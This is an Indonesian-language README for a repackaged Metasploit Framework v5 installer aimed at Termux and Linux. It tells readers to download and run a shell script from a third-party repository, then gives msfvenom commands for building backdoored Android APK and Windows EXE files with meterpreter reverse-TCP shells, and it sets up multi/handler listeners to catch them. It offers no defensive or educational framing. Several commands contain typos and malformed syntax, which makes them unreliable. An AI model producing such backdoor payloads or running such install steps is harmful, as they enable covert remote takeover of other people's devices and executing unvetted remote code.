## Metasploit-Framework-v5
Metasploit Versi lima kini sudah hadir dengan cara 
Installasi lebih mudah dengan sendirinya. System yang 
Setiap hari di update. Selain itu sekarang juga 
Sudah berkembang Metasploit Framework Sudah di Versi 5
Dari yang sebelumnya di versi 4.1.1
<br>
![alt text](https://github.com/INDOnimous/Metasploit-Framework-v5/blob/master/ss.png)
<br>
## Cara install Termux And Linux 

```fish
wget https://raw.githubusercontent.com/INDOnimous/Metasploit-Framework-v5/master/INDOsploit-V5.sh
sh INDOsploit-V5.sh
msfconsole 
```
### INDOnimous Homeland Scurity
•Untuk menjalankan Terminal Ketik ```msfconsole ```<br>
•Untuk membuat payload ```msfvenom ```<br>

### Cara membuat Payload apk Backdoor 
• Android 
``` fish
msfvenom -p android/meterpreter/reverse_tcp LHOS=(your IP/sah) LPORT=4444 R> /sdcard/INDOnimous.apk
```
• Windows
``` fish
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP/sah) LPORT=4444 f> /desktop/INDOnimous.exe
```
### Setting database Metasploit
• Android 
```fish
1. use exploit/multi/handler 
2. set payload/meterpreter/reverse_tcp
3. set lhost (you ip/ssh)
4. set lport 4444
5. exploit
```

• Windows
```fish
1. use exploit/multi/handler 
2. set windows/meterpreter/reverse_tcp
3. set lhost (you ip/ssh)
4. set lport 4444
5. exploit
```
